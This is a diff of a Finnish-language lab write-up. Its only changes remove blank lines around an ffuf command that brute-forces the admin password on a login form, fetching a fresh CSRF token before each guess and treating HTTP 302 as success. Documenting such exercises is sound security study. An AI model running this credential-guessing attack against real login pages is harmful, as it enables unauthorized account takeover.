@@ -239,7 +239,6 @@ EOF
 Seuraavaksi syötin ohjeiden mukaisesti terminaaliin komennon: 
 
 ```
-
 ffuf -w passwords.txt -u https://ffuf.io.fi/login -X POST \
   -H "Content-Type: application/x-www-form-urlencoded" \
   -d "csrf_token=CSRFTOKEN&username=admin&password=FUZZ" \
@@ -247,7 +246,6 @@ ffuf -w passwords.txt -u https://ffuf.io.fi/login -X POST \
   -preflight-var 'CSRFTOKEN:name="csrf_token" value="([a-f0-9]+)"' \
   -preflight-mode per-request \
   -mc 302
-
 ```
 
 - ```-preflight login.raw``` = Pyytää aina uuden CRTF-tokenin yrityksen jälkeen.
